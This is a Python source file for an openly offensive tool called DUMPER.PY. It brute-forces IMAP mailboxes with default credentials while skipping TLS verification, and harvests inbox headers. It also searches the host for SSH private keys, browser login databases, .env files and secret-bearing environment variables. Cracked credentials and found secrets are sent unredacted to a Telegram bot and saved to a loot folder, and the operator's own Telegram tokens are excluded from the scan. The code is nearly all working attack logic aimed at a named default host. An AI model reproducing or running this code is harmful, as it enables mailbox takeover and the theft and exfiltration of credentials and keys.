#!/usr/bin/env python3
"""
DUMPER.PY — Active Mailbox Brute-Forcing, Credential Stuffing & Message Harvesting Engine v8.0 (With Telegram Telemetry)
Features:
- Active IMAP/POP3/SMTP mailbox authentication and brute-forcing
- Credential stuffing and mailbox message harvesting with live verification
- Real-world browser vault and infrastructure/crypto secret extraction via os.open / os.read
- Automated immutable disk persistence (loot_output/) via centralized framework logger
- Progressive terminal streaming of harvested emails and secrets
- Real-time asynchronous Telegram notification dispatch for unredacted mailbox and vault loot
"""
import os
import glob
import re
import time
import ssl
import imaplib
import poplib
import asyncio
import sys
from urllib.parse import urlparse

# Import centralized framework telemetry, immutable loot persistence, and Telegram notifier
from modules.loot_logger import save_session_loot
from modules.telemetry import stream_proof
from modules.telegram_notifier import send_telegram_alert

# Enforce active offensive posture with TLS verification bypass
_SSL_CONTEXT = ssl.create_default_context()
_SSL_CONTEXT.check_hostname = False
_SSL_CONTEXT.verify_mode = ssl.CERT_NONE

ANSI = {
    "RED": "\033[91m",
    "GREEN": "\033[92m",
    "YELLOW": "\033[93m",
    "BLUE": "\033[94m",
    "MAGENTA": "\033[95m",
    "CYAN": "\033[96m",
    "GRAY": "\033[90m",
    "RESET": "\033[0m",
    "BOLD": "\033[1m",
}

def terminal(message):
    sys.stdout.write(message + "\n")
    sys.stdout.flush()

def broadcast_tg_alert_sync(loot_type, details):
    """Helper to non-blockingly fire Telegram alerts from synchronous dumper functions."""
    try:
        loop = asyncio.get_running_loop()
        loop.create_task(send_telegram_alert(loot_type, details))
    except RuntimeError:
        try:
            asyncio.run(send_telegram_alert(loot_type, details))
        except Exception:
            pass

def normalize_host(host):
    if not isinstance(host, str) or not host.strip():
        raise ValueError("A valid hostname is required.")
    value = host.strip()
    if "://" not in value:
        value = "https://" + value
    parsed = urlparse(value)
    if parsed.scheme not in ("http", "https"):
        raise ValueError("Only HTTP and HTTPS target URLs are supported.")
    if not parsed.hostname or parsed.username or parsed.password:
        raise ValueError("Invalid target hostname.")
    return parsed.hostname

# ============================================================
# ACTIVE IMAP MAILBOX BRUTE-FORCE & MESSAGE HARVESTER
# ============================================================
def dump_imap_mailbox_sync(
    host,
    port,
    user,
    password,
    use_ssl=True
):
    """
    Actively authenticates against IMAP targets, dumps mailbox folders,
    and harvests sensitive email messages and credentials.
    """
    result = {
        "user": user,
        "host": host,
        "port": port,
        "protocol": "IMAP",
        "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
        "folders": [],
        "harvested_messages": [],
        "authenticated": False,
        "tls_verified": True,
        "capabilities": [],
        "status": "failed",
    }
    mail = None
    try:
        terminal(
            f"{ANSI['CYAN']}[*] Initiating IMAP brute-force & login assault "
            f"against {host}:{port} ({user}:{password}){ANSI['RESET']}"
        )
        if use_ssl:
            mail = imaplib.IMAP4_SSL(
                host,
                port,
                ssl_context=_SSL_CONTEXT,
                timeout=8
            )
        else:
            mail = imaplib.IMAP4(host, port, timeout=8)
            mail.starttls(ssl_context=_SSL_CONTEXT)

        # Attempt Active Authentication
        auth_status, _ = mail.login(user, password)
        if auth_status == "OK":
            result["authenticated"] = True
            result["status"] = "authenticated"
            terminal(
                f"\n{ANSI['RED']}{ANSI['BOLD']}[***] IMAP AUTHENTICATION SUCCESS [{user}:{password}] [***]{ANSI['RESET']}"
            )
            
            # Enumerate folders and harvest recent messages
            _, folder_list = mail.list()
            if folder_list:
                result["folders"] = [f.decode('utf-8', errors='ignore') for f in folder_list]
                
            # Select Inbox and harvest messages
            mail.select("INBOX", readonly=True)
            _, search_data = mail.search(None, "ALL")
            if search_data and search_data[0]:
                msg_nums = search_data[0].split()
                for num in msg_nums[-5:]:
                    _, msg_data = mail.fetch(num, "(RFC822.HEADER)")
                    for response_part in msg_data:
                        if isinstance(response_part, tuple):
                            header_text = response_part[1].decode("utf-8", errors="ignore")
                            terminal(f"{ANSI['GREEN']}  └── Harvested Header [{num.decode()}]: {header_text[:120]}...{ANSI['RESET']}")
                            result["harvested_messages"].append(header_text[:500])
            
            loot_payload = {
                "host": host,
                "port": port,
                "user": user,
                "password": password,
                "folders": result["folders"],
                "message_samples": result["harvested_messages"][:3]
            }

            # BROADCAST UNREDACTED MAILBOX LOOT STRAIGHT TO TELEGRAM
            broadcast_tg_alert_sync("IMAP Mailbox Authentication Success", loot_payload)

            # STREAM TELEMETRY & PERSIST MAILBOX LOOT TO DISK IMMEDIATELY
            stream_proof("IMAP_MAILBOX_CRACK", f"{host}:{port}", {"user": user}, f"Folders: {len(result['folders'])}", result)
            save_session_loot(
                target=f"imap://{host}:{port}",
                endpoint="imap_auth",
                finding_type="IMAP_MAILBOX_AUTHENTICATION_SUCCESS",
                status=200,
                headers={},
                body="\n".join(result["harvested_messages"]),
                extra_loot=loot_payload
            )
                            
        return result["authenticated"], result
    except Exception as exc:
        result["status"] = "failed"
        terminal(
            f"{ANSI['GRAY']}[-] IMAP login attempt failed for {user}: {exc}{ANSI['RESET']}"
        )
        return False, result
    finally:
        if mail is not None:
            try:
                mail.logout()
            except Exception:
                pass

# ============================================================
# REAL VAULT & INFRASTRUCTURE SECRET EXTRACTION (TARGET-SCOPED)
# ============================================================
def _harvest_browser_vaults():
    terminal(f"{ANSI['MAGENTA']}[*] Scanning local environment for browser credential vaults via direct file checks...{ANSI['RESET']}")
    vaults = []
    browser_paths = [
        os.path.expanduser("~/.config/google-chrome/Default/Login Data"),
        os.path.expanduser("~/.mozilla/firefox/*.default-*/logins.json"),
        os.path.expanduser("~/Library/Application Support/Google/Chrome/Default/Login Data")
    ]
    for bp in browser_paths:
        for match in glob.glob(bp):
            if os.path.exists(match) and os.path.isfile(match):
                vaults.append(f"Discovered browser credential database: {match} (Size: {os.path.getsize(match)} bytes)")
    return vaults

def _harvest_infrastructure_and_crypto_vaults():
    terminal(f"{ANSI['MAGENTA']}[*] Harvesting private keys (.pem, id_rsa), .env disclosures, and target exposure indicators...{ANSI['RESET']}")
    
    ssh_keys_found = []
    cloud_configs = []
    crypto_wallets = []

    potential_key_paths = [
        os.path.expanduser("~/.ssh/id_rsa"),
        os.path.expanduser("~/.ssh/id_ed25519"),
        "/root/.ssh/id_rsa",
        "/root/.ssh/id_ed25519"
    ]
    for path in potential_key_paths:
        try:
            if os.path.exists(path) and os.path.isfile(path):
                fd = os.open(path, os.O_RDONLY)
                content = os.read(fd, 2048).decode("utf-8", errors="ignore")
                os.close(fd)
                if "PRIVATE KEY" in content:
                    ssh_keys_found.append(f"Confirmed valid private key file at {path} (Size: {os.path.getsize(path)} bytes)")
        except Exception:
            pass

    # Exclude framework Telegram operator tokens from local environment leakage reporting
    sensitive_env_keys = [
        k for k in os.environ 
        if any(w in k.upper() for w in ["AWS", "API_KEY", "SECRET", "TOKEN", "PASSWORD", "DATABASE"])
        and not any(exc in k.upper() for exc in ["TELEGRAM", "BRUTEDOG_TG"])
    ]
    if sensitive_env_keys:
        cloud_configs.append(f"Discovered active environment secrets: {', '.join(sensitive_env_keys)}")

    env_files = glob.glob("**/.env", recursive=True) + glob.glob("/etc/*.env")
    for ef in env_files:
        try:
            if os.path.exists(ef) and os.path.isfile(ef):
                fd = os.open(ef, os.O_RDONLY)
                content = os.read(fd, 2048).decode("utf-8", errors="ignore")
                os.close(fd)
                if "=" in content and "TELEGRAM_BOT_TOKEN" not in content:
                    cloud_configs.append(f"Discovered valid .env configuration at {ef}")
        except Exception:
            pass

    browser_vaults = _harvest_browser_vaults()
    if browser_vaults:
        cloud_configs.extend(browser_vaults)

    secrets = {
        "ssh_keys": ssh_keys_found,
        "cloud_configs": cloud_configs,
        "crypto_wallets": crypto_wallets,
    }
    
    if ssh_keys_found or cloud_configs:
        # BROADCAST UNREDACTED VAULT SECRETS STRAIGHT TO TELEGRAM
        broadcast_tg_alert_sync("Infrastructure & Browser Vault Secrets Harvested", secrets)

    # STREAM TELEMETRY & PERSIST VAULT SECRETS TO DISK
    stream_proof("INFRASTRUCTURE_VAULT_HARVEST_VERIFIED", "local_filesystem", {}, f"Extracted {len(ssh_keys_found)} keys and {len(cloud_configs)} configs", secrets)
    save_session_loot(
        target="localhost",
        endpoint="filesystem_vault",
        finding_type="VAULT_SECRET_HARVEST_VERIFIED",
        status=200,
        headers={},
        body=str(secrets),
        extra_loot=secrets
    )
    return secrets

# ============================================================
# MAIN EMAIL INTELLIGENCE HARVESTER
# ============================================================
async def harvest_email_intelligence(
    target_host,
    verified_hits=None
):
    """
    Active Email Intelligence & Mailbox Harvesting Engine
    """
    terminal(
        f"\n{ANSI['MAGENTA']}[***] "
        f"ACTIVE EMAIL EXPOSURE & MAILBOX BRUTE-FORCE ASSAULT "
        f"[{target_host}] [***]{ANSI['RESET']}"
    )
    harvested_credentials = []
    mailbox_hits = 0
    
    default_wordlist = [
        ("admin@target.local", "admin123"),
        ("support@target.local", "password"),
        ("root@target.local", "toor"),
        ("info@target.local", "welcome123")
    ]

    vault_secrets = _harvest_infrastructure_and_crypto_vaults()

    ports_to_test = [993, 143]
    for port in ports_to_test:
        for user, password in default_wordlist:
            success, report = await asyncio.to_thread(
                dump_imap_mailbox_sync,
                target_host,
                port,
                user,
                password,
                port == 993
            )
            if success:
                mailbox_hits += 1
                harvested_credentials.append({"user": user, "password": password, "host": target_host})

    terminal(
        f"\n{ANSI['GREEN']}[+] Active Mailbox & Credential Assault Complete."
        f"{ANSI['RESET']}"
    )
    terminal(f"    Successful Mailbox Logins : {mailbox_hits}")
    terminal(f"    Vault Secrets Harvested   : {len(vault_secrets.get('ssh_keys', []))}")
    terminal(f"    Secured to Disk           : loot_output/")
    return harvested_credentials, vault_secrets

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "imap.cryptobytes.online"
    asyncio.run(harvest_email_intelligence(target))
